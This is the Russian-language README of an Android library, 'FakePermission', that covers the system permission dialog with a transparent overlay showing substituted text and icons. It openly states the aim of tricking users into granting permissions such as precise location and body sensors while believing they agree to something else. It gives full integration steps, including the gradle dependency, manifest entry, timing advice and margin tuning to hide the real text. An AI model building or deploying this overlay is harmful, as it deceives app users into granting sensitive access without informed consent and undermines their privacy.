# FakePermission
Android Fake Permission Tool

Библиотека предоставляет возможность перекрывать системный диалог выдачи разрешений начиная с Android 7.1.1 (Api 25). Таким образом вы сможете незаметно для конечного пользователя выдавать вашему приложению нужные разрешения, вводя пользователя в заблуждение, заставляя его соглашаться с тем что он увидит, а не с тем, что будет в действительности.

**Все предоставляется как есть, и не призывает никого к использованию**

## Демонстрация работы библиотеки
<img src="Samples.gif" width="220" height="400"/>

## Подключение

Добавьте в build.gradle модуля вашего приложения
```
implementation 'com.vittach:fakepermission:1.0.3'
```
Создайте стиль
```
<style name="Theme.Transparent" parent="AppTheme">
    <item name="android:windowBackground">@android:color/transparent</item>
    <item name="android:windowIsTranslucent">true</item>
</style>
```
Укажите активити в файле манифеста
```
<activity
    android:name="com.vittach.fakepermission.PermissionActivity"
    android:theme="@style/Theme.Transparent" />
```
## Настройка и пример использования

Для активации библиотеки необходимо запустить ее активити *PermissionActivity* и передать нужные конфигурационные параметры сразу строго ПОСЛЕ вызова системного диалога на выдачу пермишенов.

Если вы используете сторонние библиотеки для вызова системного диалога, как например такую на базе корутин:
```
com.sagar:coroutinespermission:1.0.0
```
То убедитесь, что корутина, в которой она будет вызываться имеет немедленный диспетчер: Dispatchers.Main.immediate.

Порядок появления диалогов очень важен, поскольку FakePermission по своей сути просто перекрывает системный диалог.
```
startActivity(
    Intent(this, PermissionActivity::class.java)
        .apply {
            putExtra(ACCENT_COLOR, getColor(R.color.accentColor))
            putExtra(TEXT_COLOR, getColor(R.color.textColor))
            putExtra(FONT_FAMILY, "sans-serif-medium")
            putExtra(ORIGIN_PERMISSIONS, originPermissions)
            putExtra(FAKE_PERMISSIONS, fakePermissions)
            putExtra(FAKE_ICONS, fakeIcons)
            putExtra(PORTRAIT_BOTTOM_MARGINS, portraitBottomMargins)
            putExtra(PORTRAIT_SIDE_MARGINS, portraitSideMargins)
            putExtra(LAND_BOTTOM_MARGINS, landBottomMargins)
            putExtra(LAND_SIDE_MARGINS, landSideMargins)
        }
)
```
#### Обязательные конфигурационные параметры:
* **ORIGIN_PERMISSIONS**
    ```
    val originPermissions = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.BODY_SENSORS,
        ...
    )
    ```
* **FAKE_PERMISSIONS**

    Массив строк, текст которых будет отображаться поверх реального. Размерность массива должна совпадать с массивом *originPermissions*.
    Если кастомный текст по длине будет больше чем исходный, то перекрываемая область увеличится

    ```
    val fakePermissions: Array<String> = arrayOf(
        getString(R.string.permission_fine_location_fake),
        getString(R.string.permission_body_sensors_fake),
        ...
    )
    ```
#### Необязательные конфигурационные параметры:
Вы можете настраивать отступы снизу и по бокам для каждого из выдаваемых пермишенов по порядку их запроса так, чтобы добиться полного перекрытия исходного текста. Поддерживается настройка как для портретной так и ландшафтной ориентации.
* **PORTRAIT_BOTTOM_MARGINS**
    ```
    val portraitBottomMargins: Array<Int> = arrayOf(
        50f.pxFromDp(this),
        32f.pxFromDp(this),
        ...
    }
    ```
* **PORTRAIT_SIDE_MARGINS**
* **LAND_BOTTOM_MARGINS**
* **LAND_SIDE_MARGINS**

Вы также можете установить свои иконки для каждого из запрашиваемых разрешений. При этом размерность массива может не совпадать с массивом *originPermissions*, в таком случае в качестве иконки, когда очередь до нее дойдет, будет использоваться последняя.
* **FAKE_ICONS**
    ```
    val fakeIcons: Array<Int> = arrayOf(
        R.drawable.ic_location,
        R.drawable.ic_anchor,
        ...
    )
    ```
* **ACCENT_COLOR** - используется для тинтования иконки
* **TEXT_COLOR** - используется приминительно к тексту
* **FONT_FAMILY** - поддерживаются стандартные шрифты
